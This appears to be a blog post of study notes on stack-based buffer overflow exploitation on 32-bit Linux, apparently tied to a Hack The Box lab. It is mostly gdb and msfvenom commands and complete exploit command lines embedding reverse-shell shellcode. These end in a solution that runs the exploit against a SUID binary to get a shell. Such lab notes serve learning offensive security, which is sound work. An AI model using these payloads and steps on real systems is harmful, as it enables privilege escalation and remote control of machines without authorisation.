---
layout: post
title: "overflows"
keywords: "linux, overflow"
---

Suppose too much data is written to a reserved memory buffer or stack that is not limited, for example. In that case, specific registers will be overwritten, which may allow code to be executed.

`RAM` describes a memory type whose memory allocations can be accessed directly and randomly by their `memory addresses`.

The `cache` is integrated into the processor and serves as a buffer, which in the best case, ensures that the processor is always fed with data and program code.

The `CU` contains the `Instruction Register (IR)`, which contains all instructions that the processor decodes and executes accordingly.

Each CPU architectures is built in a specific way, called `Instruction Set Architecture (ISA)`, which the CPU uses to execute its processes. 

> Buffer overflows are errors that allow data that is too large to fit into a buffer of the operating system's memory that is not large enough, thereby overflowing this buffer. As a result of this mishandling, the memory of other functions of the executed program is overwritten, potentially creating a security vulnerability.

### Set Intel-flavor as Default
```
echo 'set disassembly-flavor intel' > ~/.gdbinit
```

### Disassemble a Function
```
gdb -q <BINARY>
> set disassembly-flavor intel
> disassemble <FUNCTION>
> quit
```

`EIP`/`RIP` - Instruction Pointer stores the offset address of the next instruction to be executed.

The `call` instruction is used to call a function and performs two operations:
- it pushes the return address onto the stack so that the execution of the program can be continued after the function has successfully fulfilled its goal,
- it changes the `instruction pointer (EIP)` to the call destination and starting execution there.

One of the most important aspects of a stack-based buffer overflow is to `get the instruction pointer (EIP) under control, so we can tell it to which address it should jump`. This will make the EIP point to the address where our shellcode starts and causes the CPU to execute it.

### Generate Pattern & Find Offset
```bash
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt

/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 0x69423569
#[*] Exact match at offset 1036
```
or
```python
>>> from pwn import *
>>> cyclic(1200)
b'aaaabaaacaaa...'
>>> cyclic_find(b'gaaa')
24
# 64-bit
>>> cyclic(1200, n=8)
b'aaaaaaaabaaaaaaacaaaaaaa...'
```

### Overwrite EIP
```bash
gdb -q <BINARY>
> run $(python -c "print '\x55' * 1200")
# Program received signal SIGSEGV, Segmentation fault.
# 0x55555555 in ?? ()
> run "Aa0Aa1Aa2Aa3..."
> info registers eip
# eip  0x69423569  0x69423569
# [*] Exact match at offset 1036
> run $(python -c "print '\x55' * 1036 + '\x66' * 4")
> info registers eip
# eip  0x66666666  0x66666666
```

#### Size of stack space after overwriting the EIP:
```
> info proc all
```

### Determine the Length for Shellcode
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

# Payload size: 68 bytes 
```
 
We now know that our payload will be about 68 bytes but as a precaution we should go larger.

Often it can be useful to insert some `no operation instruction (NOPS)` before our shellcode begins so that it can be executed cleanly.
```
Buffer      = "\x55" * (1036 - 100 - 150) = 786
+ NOPs      = "\x90" * 100
+ Shellcode = "\x44" * 150
+ EIP       = "\x66" * 4
```
```
run $(python -c 'print "\x55" * (1036 - 100 - 150) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
```

### Identification of Bad Characters
```bash
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

echo $CHARS | sed 's/\\x/ /g' | wc -w
# 256
```

```
Buffer   = "\x55" * (1036 - 256) = 780
+ CHARS  = "\x00\x01\x02\x03\x04..."
+ EIP    = "\x66" * 4
```

#### Setting a Breakpoint

```
gdb -q <BINARY>
> disas <MAIN>
> break <FUNCTION>
> run $(python -c 'print "\x55" * (1036 - 256) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')
> x/2000xb $esp+500
```

Find from which address our "\x55" begins and contiue to the place where our CHARS start.

We see the CHARS variable `begins with "\x01" instead of "\x00"`. Note this character, remove it from our variable CHARS.

```
> run $(python -c 'print "\x55" * (1036 - 255) + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')
> x/2000xb $esp+500
```

Here it `depends on our bytes' correct order in the variable CHARS` to see if any character changes, interrupts, or skips the order. Now we recognize that `after the "\x08", we encounter the "\x00" instead of the "\x09"` as expected. This tells us that this character is not allowed here and must be removed accordingly. `Repeat this process removing all bad characters.`

```
\x00\x09\x0a\x20
```

```
> run $(python -c 'print "\x55" * (1036 - 252) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')
> x/2000xb $esp+500
```

### Generating Shellcode
```
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>

cat shellcode
```
```
Buffer      = "\x55" * (1036 - 124 - 95) = 817
+ NOPs      = "\x90" * 124
+ Shellcode = "\xda\xca\xba..."
+ EIP       = "\x66" * 4'
```
```
> run $(python -c 'print "\x55" * (1036 - 124 - 95) + "\x90" * 124 + "\xda\xda\xd9\x74\x24\xf4\x5a\xbf\x56\x16\x42\xf7\x31\xc9\xb1\x12\x83\xea\xfc\x31\x7a\x13\x03\x2c\x05\xa0\x02\xe1\xf2\xd3\x0e\x52\x46\x4f\xbb\x56\xc1\x8e\x8b\x30\x1c\xd0\x7f\xe5\x2e\xee\xb2\x95\x06\x68\xb4\xfd\xe7\x8a\x46\xfc\x7f\x89\x46\x84\x16\x04\xa7\xc8\x8f\x46\x79\x7b\xe3\x64\xf0\x9a\xce\xeb\x50\x34\xbf\xc4\x27\xac\x57\x34\xe7\x4e\xc1\xc3\x14\xdc\x42\x5d\x3b\x50\x6f\x90\x3c" + "\x66" * 4')
> x/2000xb $esp+500
```

### Identification of the Return Address

We now need a memory address where our NOPs are located to tell the EIP to jump to it. 

After selecting a memory address, we `replace our "\x66" which overwrites the EIP to tell it to jump to the 0xffffd64c address`. Note that the input of the address is entered backward.

```
Buffer = "\x55" * (1036 - 124 - 95) = 841
+ NOPs = "\x90" * 124
+ Shellcode = "\xda\xca\xba..."
+ EIP = "\x4c\xd6\xff\xff"
```
```
nc -nlvp 31337

gdb -q <BINARY>
> run $(python -c 'print "\x55" * (1036 - 124 - 95) + "\x90" * 124 + "\xd9\xe8\xd9\x74\x24\xf4\xba\x76\xe4\xef\x5d\x58\x31\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x9e\x18\x0d\xa8\x6f\x3a\x25\xb0\xdc\xff\x99\x5d\xe0\x76\xfc\x12\x82\x45\x7f\xc1\x13\xe6\xbf\x2b\x23\x4f\xb9\x4a\x4b\x2f\x39\xad\x8a\xa7\x3b\xad\xf6\x5e\xb5\x4c\xb6\xc7\x95\xdf\xe5\xb4\x15\x69\xe8\x76\x99\x3b\x82\xe6\xb5\xc8\x3a\x9f\xe6\x01\xd8\x36\x70\xbe\x4e\x9a\x0b\xa0\xde\x17\xc1\xa3" + "\x4c\xd6\xff\xff"')
```

### Prevention Techniques and Mechanisms
- Canaries
- Address Space Layout Randomization (ASLR)
- Data Execution Prevention (DEP)

### Hack The Box Solution
```shell
# [*] Exact match at offset 2060
# Stack size 0x22000

> run $(python -c "print '\x55' * 2060 + '\x66' * 4")
> info registers eip
# eip 0x66666666

# Buffer      = "\x55" * (2060 - 124 - 95)
# + NOPs      = "\x90" * 124
# + Shellcode = "\xda\xca\xba..."
# + EIP       = "\x66" * 4'

> run $(python -c 'print "\x55" * (2060 - 124 - 95) + "\x90" * 124 + "\xd9\xe8\xd9\x74\x24\xf4\xba\x76\xe4\xef\x5d\x58\x31\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x9e\x18\x0d\xa8\x6f\x3a\x25\xb0\xdc\xff\x99\x5d\xe0\x76\xfc\x12\x82\x45\x7f\xc1\x13\xe6\xbf\x2b\x23\x4f\xb9\x4a\x4b\x2f\x39\xad\x8a\xa7\x3b\xad\xf6\x5e\xb5\x4c\xb6\xc7\x95\xdf\xe5\xb4\x15\x69\xe8\x76\x99\x3b\x82\xe6\xb5\xc8\x3a\x9f\xe6\x01\xd8\x36\x70\xbe\x4e\x9a\x0b\xa0\xde\x17\xc1\xa3" + "\x66" * 4')

> x/2000xb $esp+500

# 0xff ff d7 2c

> run $(python -c 'print "\x55" * (2060 - 124 - 95) + "\x90" * 124 + "\xd9\xe8\xd9\x74\x24\xf4\xba\x76\xe4\xef\x5d\x58\x31\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x9e\x18\x0d\xa8\x6f\x3a\x25\xb0\xdc\xff\x99\x5d\xe0\x76\xfc\x12\x82\x45\x7f\xc1\x13\xe6\xbf\x2b\x23\x4f\xb9\x4a\x4b\x2f\x39\xad\x8a\xa7\x3b\xad\xf6\x5e\xb5\x4c\xb6\xc7\x95\xdf\xe5\xb4\x15\x69\xe8\x76\x99\x3b\x82\xe6\xb5\xc8\x3a\x9f\xe6\x01\xd8\x36\x70\xbe\x4e\x9a\x0b\xa0\xde\x17\xc1\xa3" + "\x2c\xd7\xff\xff"')

# Binary has SUID
./leave_msg $(python -c 'print "\x55" * (2060 - 124 - 95) + "\x90" * 124 + "\xd9\xe8\xd9\x74\x24\xf4\xba\x76\xe4\xef\x5d\x58\x31\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x9e\x18\x0d\xa8\x6f\x3a\x25\xb0\xdc\xff\x99\x5d\xe0\x76\xfc\x12\x82\x45\x7f\xc1\x13\xe6\xbf\x2b\x23\x4f\xb9\x4a\x4b\x2f\x39\xad\x8a\xa7\x3b\xad\xf6\x5e\xb5\x4c\xb6\xc7\x95\xdf\xe5\xb4\x15\x69\xe8\x76\x99\x3b\x82\xe6\xb5\xc8\x3a\x9f\xe6\x01\xd8\x36\x70\xbe\x4e\x9a\x0b\xa0\xde\x17\xc1\xa3" + "\x2c\xd7\xff\xff"')
```